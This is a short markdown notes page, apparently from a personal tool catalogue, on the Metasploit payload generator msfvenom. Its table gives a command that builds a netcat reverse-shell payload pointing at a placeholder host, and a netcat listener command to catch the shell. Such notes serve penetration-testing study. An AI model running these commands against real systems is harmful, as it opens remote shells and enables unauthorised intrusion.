---
topic: msfvenom
type: tool
site: https://github.com/rapid7/metasploit-framework
status: tried
included_topics:
  - cli
  - hacking
language:
  - bash
history:
  found: 2023/04/21
  tried: 2023/04/21
  used:
  core:
  hold:
os:
  - linux
  - windows
  - mac
---

# msfvenom
[Readme](../../README.md)

- [msfvenom](#msfvenom)
  - [Commands](#commands)
    - [Examples](#examples)


## Commands
### Examples

| What                        | Command                                                         |
| :-------------------------- | :-------------------------------------------------------------- |
| Payload for reverse shell   | ```msfvenom -p cmd/unix/reverse_netcat lhost=ip lport=4444 R``` |
| Open port for reverse shell | ```nc -lvp 4444```                                              |

